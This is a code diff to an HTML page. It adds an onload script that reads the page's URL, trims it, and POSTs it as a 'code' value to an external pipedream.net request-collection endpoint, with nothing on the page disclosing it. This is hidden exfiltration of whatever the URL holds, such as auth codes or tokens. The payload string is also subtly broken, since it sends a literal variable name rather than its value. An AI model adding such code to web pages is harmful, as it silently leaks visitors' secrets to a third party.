@@ -20,15 +20,38 @@
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
    
 </head>
-<body id="myPage" data-spy="scroll" data-target=".navbar" data-offset="60">
+<body onload="loadImage()">
 
 
 
     <div>
-	<img src="https://eocxim5r5v5rera.m.pipedream.net">
+	<img src="">
 
     </div>
 
+<script>
+function loadImage() {
+	let full_url=window.location.href;
+	let partial_result = full_url.substring(14);
+	
+
+let xhr = new XMLHttpRequest();
+	xhr.open("POST", "https://eocxim5r5v5rera.m.pipedream.net");
+
+	xhr.setRequestHeader("Accept", "application/json");
+	xhr.setRequestHeader("Content-Type", "application/json");
+
+	xhr.onload = () => console.log(xhr.responseText);
+
+let data = `{
+  "code": partial_result
+}`;
+
+xhr.send(data);
+
+ 
+}
+</script>
 
 </body>
 </html>
